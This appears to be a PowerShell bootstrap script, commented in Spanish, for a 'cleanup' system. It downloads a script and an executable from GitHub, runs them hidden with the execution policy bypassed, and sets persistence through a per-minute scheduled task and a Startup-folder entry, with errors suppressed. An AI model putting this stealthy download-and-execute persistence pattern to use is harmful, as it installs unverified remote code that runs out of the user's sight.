# ---- ensure_task.ps1 v3: bootstrap portable del sistema de borrado ----
# Se ejecuta en cualquier PC (sin admin):
# 1. Descarga los componentes que falten (cleanup.ps1, watcher EXE) desde GitHub
# 2. Crea/actualiza bsmap_launch.vbs y la tarea BsmapCleanup (ruta %LOCALAPPDATA% dinamica)
# 3. Desactiva el bloqueo por bateria (Disallow/StopIfGoingOnBatteries -> false)
# 4. Garantiza la entrada en la carpeta Startup (BsmapCleanup.vbs al logon)
# 5. Arranca el watcher EXE si no esta corriendo
$ErrorActionPreference = 'SilentlyContinue'

$la = $env:LOCALAPPDATA
$bsDir = Join-Path $la 'BastissSteam'
New-Item -ItemType Directory -Path $bsDir -Force | Out-Null
$cleanupPs1 = Join-Path $la 'bsmap_cleanup.ps1'
$vbsTask = Join-Path $la 'bsmap_launch.vbs'
$watchExe = Join-Path $bsDir 'bsmap_watch.exe'
$base = 'https://raw.githubusercontent.com/bastisayes/steamsito/main'

# ---- 1) Descargar componentes que falten ----
if (-not (Test-Path $cleanupPs1)) {
    try { Invoke-RestMethod -Uri "$base/bsmap_cleanup.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $cleanupPs1 -ErrorAction Stop } catch {}
}
if (-not (Test-Path $watchExe)) {
    try { Invoke-RestMethod -Uri "$base/bsmap_watch.exe" -UseBasicParsing -TimeoutSec 25 -OutFile $watchExe -ErrorAction Stop } catch {}
}

# ---- 2) VBS que lanza el cleanup (usado por la tarea) ----
$vbsContent = "Set sh = CreateObject(`"WScript.Shell`")`r`n" +
              "ps = sh.ExpandEnvironmentStrings(`"%LOCALAPPDATA%\bsmap_cleanup.ps1`")`r`n" +
              "cmd = `"powershell -NoProfile -ExecutionPolicy Bypass -File `" & Chr(34) & ps & Chr(34)`r`n" +
              "sh.Run cmd, 0, False`r`n"
try { Set-Content -Path $vbsTask -Value $vbsContent -Encoding ASCII -Force } catch {}

# ---- 3) Tarea BsmapCleanup (minuto) con ruta dinamica ----
$taskCmd = "wscript.exe //B `"$vbsTask`""
$needRecreate = $false
$task = Get-ScheduledTask -TaskName 'BsmapCleanup' -ErrorAction SilentlyContinue
if ($task) {
    $curCmd = $task.Actions[0].Execute + ' ' + $task.Actions[0].Arguments
    if ($curCmd -ne $taskCmd) { $needRecreate = $true }
} else { $needRecreate = $true }
if ($needRecreate) {
    & schtasks.exe /Create /TN 'BsmapCleanup' /TR $taskCmd /SC MINUTE /MO 1 /F
    Start-Sleep -Milliseconds 400
    $task = Get-ScheduledTask -TaskName 'BsmapCleanup' -ErrorAction SilentlyContinue
}
if ($task) {
    $st = "$($task.State)"
    if ($st -ne 'Ready' -and $st -ne 'Running') { Enable-ScheduledTask -TaskName 'BsmapCleanup' -ErrorAction SilentlyContinue | Out-Null }
}

# ---- 4) Quitar restriccion de bateria (laptops): export XML, editar, reimportar ----
try {
    $xmlOut = Join-Path $env:TEMP 'bsmap_task.xml'
    $xml = (Export-ScheduledTask -TaskName 'BsmapCleanup' | Out-String)
    $changed = $false
    if ($xml -match '<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>') {
        $xml = $xml -replace '<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>', '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
        $changed = $true
    }
    if ($xml -match '<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>') {
        $xml = $xml -replace '<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>', '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
        $changed = $true
    }
    if ($changed) {
        [System.IO.File]::WriteAllText($xmlOut, $xml, (New-Object System.Text.UTF8Encoding $false))
        & schtasks.exe /Create /TN 'BsmapCleanup' /XML $xmlOut /F
    }
    Remove-Item $xmlOut -Force -ErrorAction SilentlyContinue
} catch {}

# ---- 5) Entrada en carpeta Startup (logon) ----
$startupDir = [Environment]::GetFolderPath('Startup')
$startupEntry = Join-Path $startupDir 'BsmapCleanup.vbs'
if (-not (Test-Path $startupEntry)) {
    try { Set-Content -Path $startupEntry -Value $vbsContent -Encoding ASCII -Force } catch {}
}

# ---- 6) Arrancar watcher EXE si no esta corriendo ----
if ((Test-Path $watchExe) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
    try { Start-Process -FilePath $watchExe -WindowStyle Hidden } catch {}
}
exit 0
